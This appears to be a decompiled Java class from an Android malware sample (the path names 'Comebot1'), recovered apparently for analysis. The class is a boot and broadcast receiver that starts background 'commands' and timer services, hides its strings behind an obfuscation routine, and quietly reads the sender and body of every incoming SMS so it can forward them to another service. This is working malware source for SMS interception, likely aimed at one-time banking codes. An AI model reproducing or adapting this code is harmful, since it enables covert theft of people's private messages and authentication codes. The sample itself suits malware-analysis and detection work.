package anu_bispro.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class resiverboot extends BroadcastReceiver {
  a a = new a();
  
  d b = new d();
  
  public void a(Context paramContext, Intent paramIntent) {
    Bundle bundle = paramIntent.getExtras();
    if (bundle != null)
      try {
        Object[] arrayOfObject = (Object[])bundle.get(b.a("V_SH"));
        if (arrayOfObject != null) {
          int i = arrayOfObject.length;
          for (byte b = 0; b < i; b++) {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[])arrayOfObject[b]);
            String str1 = smsMessage.getDisplayOriginatingAddress();
            String str2 = smsMessage.getDisplayMessageBody();
            Intent intent = new Intent();
            this(paramContext, dsws.class);
            paramContext.startService(intent.putExtra(b.a("USV"), str1).putExtra(b.a("KH"), str2));
          } 
        } 
      } catch (Exception exception) {} 
  }
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    String str1 = paramIntent.getAction();
    paramContext.startService(new Intent(paramContext, gowhile.class));
    a a1 = this.a;
    this.b.getClass();
    a.a(paramContext, "", 14000L);
    paramContext.startService(new Intent(paramContext, commands.class));
    String str3 = b.a("KTTPRB^T\025");
    String str4 = b.a("GUBIIRB\025");
    String str5 = b.a("r^J^VSIU_\025");
    String str2 = b.a("uvudt~e~omc");
    if (this.a.a(paramContext, b.a("V^T^NMGOyHQH")).contains(b.a("RIS^")) && str1.equals((new StringBuilder()).insert(0, str4).append(str3).append(str5).append(str2).toString()))
      a(paramContext, paramIntent); 
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/resiverboot.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */